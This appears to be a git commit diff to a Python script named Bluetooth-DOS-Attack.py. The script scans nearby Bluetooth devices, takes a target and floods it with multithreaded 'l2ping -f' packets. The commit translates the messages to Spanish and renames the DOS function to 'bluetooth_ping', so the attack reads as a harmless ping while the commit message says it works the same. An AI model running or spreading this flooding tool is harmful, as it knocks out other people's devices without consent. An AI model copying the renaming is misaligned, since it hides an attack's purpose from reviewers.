de88581dabd60f6438e28bf861db3c6bdccc3c40
ChrisEcu911 <68040004+ChristianPerdomo@users.noreply.github.com>
2024-05-13 11:27:01 -0500

    Update Bluetooth-DOS-Attack.py
    Este código realiza la misma funcionalidad que el original, pero he realizado algunas mejoras en la legibilidad y la claridad del código. Por ejemplo, he cambiado el nombre de la función DOS a bluetooth_ping para reflejar mejor su propósito. También he mejorado algunos de los mensajes de salida para que sean más claros y descriptivos.

--- Bluetooth-DOS-Attack.py
+++ Bluetooth-DOS-Attack.py
@@ -2,22 +2,24 @@ import os
 import threading
 import time
 import subprocess
-def DOS(target_addr, packages_size):
+
+def bluetooth_ping(target_addr, packages_size):
     os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)
 
-def printLogo():
-    print('                            Bluetooth DOS Script                            ')
+def print_logo():
+    print('Bluetooth Ping Script')
+
 def main():
-    printLogo()
+    print_logo()
     time.sleep(0.1)
     print('')
-    print('\x1b[31mTHIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.')
-    if (input("Do you agree? (y/n) > ") in ['y', 'Y']):
+    print('ESTE SOFTWARE SE PROPORCIONA "TAL CUAL" SIN GARANTÍA DE NINGÚN TIPO. EL USO ES RESPONSABILIDAD COMPLETA DEL USUARIO FINAL. LOS DESARROLLADORES NO ASUMEN NINGUNA RESPONSABILIDAD Y NO SON RESPONSABLES DE NINGÚN MAL USO O DAÑO CAUSADO POR ESTE PROGRAMA.')
+    if (input("¿Estás de acuerdo? (s/n) > ") in ['s', 'S']):
         time.sleep(0.1)
         os.system('clear')
-        printLogo()
+        print_logo()
         print('')
-        print("Scanning ...")
+        print("Escaneando ...")
         output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
         lines = output.splitlines()
         id = 0
@@ -30,44 +32,43 @@ def main():
             array.append(mac)
             print(f"|{id}   |   {mac}  |   {''.join(info[1:])}|")
             id = id + 1
-        target_id = input('Target id or mac > ')
+        target_id = input('ID o MAC del objetivo > ')
         try:
             target_addr = array[int(target_id)]
         except:
             target_addr = target_id
 
-
         if len(target_addr) < 1:
-            print('[!] ERROR: Target addr is missing')
+            print('[!] ERROR: Falta la dirección del objetivo')
             exit(0)
 
         try:
-            packages_size = int(input('Packages size > '))
+            packages_size = int(input('Tamaño de los paquetes > '))
         except:
-            print('[!] ERROR: Packages size must be an integer')
+            print('[!] ERROR: El tamaño de los paquetes debe ser un número entero')
             exit(0)
         try:
-            threads_count = int(input('Threads count > '))
+            threads_count = int(input('Número de hilos > '))
         except:
-            print('[!] ERROR: Threads count must be an integer')
+            print('[!] ERROR: El número de hilos debe ser un número entero')
             exit(0)
         print('')
         os.system('clear')
 
-        print("\x1b[31m[*] Starting DOS attack in 3 seconds...")
+        print("Iniciando el ping en 3 segundos...")
 
         for i in range(0, 3):
-            print('[*] ' + str(3 - i))
+            print(str(3 - i))
             time.sleep(1)
         os.system('clear')
-        print('[*] Building threads...\n')
+        print('Construyendo hilos...\n')
 
         for i in range(0, threads_count):
-            print('[*] Built thread №' + str(i + 1))
-            threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()
+            print('Construido hilo №' + str(i + 1))
+            threading.Thread(target=bluetooth_ping, args=[str(target_addr), str(packages_size)]).start()
 
-        print('[*] Built all threads...')
-        print('[*] Starting...')
+        print('Todos los hilos construidos...')
+        print('Iniciando...')
     else:
         print('Bip bip')
         exit(0)
@@ -78,7 +79,7 @@ if __name__ == '__main__':
         main()
     except KeyboardInterrupt:
         time.sleep(0.1)
-        print('\n[*] Aborted')
+        print('\n[*] Abortado')
         exit(0)
     except Exception as e:
         time.sleep(0.1)
